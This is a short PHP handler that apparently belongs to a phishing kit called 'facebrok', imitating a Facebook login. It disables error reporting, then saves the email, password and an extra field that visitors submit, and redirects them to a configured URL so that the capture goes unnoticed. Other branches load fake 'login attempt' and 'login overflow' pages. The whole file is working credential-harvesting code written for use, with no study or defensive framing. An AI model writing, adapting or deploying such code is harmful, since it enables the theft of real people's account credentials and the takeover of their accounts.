<?php

	// FACEBROK LOGIN EVENT
	include 'croak/core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();
	$facebrok->checkInstall();
	if($_GET['lwv']==1){include 'login_attempt.php';}
	else if ($_GET['lwv']==2){include 'login_overflow.php';}else{
		$facebrok->save_register($_POST['email'],$_POST['pass'],$_POST['holy']);
		$url_redirect=$facebrok->get_url_redirect();
		header("location: ".$url_redirect);
	}
?>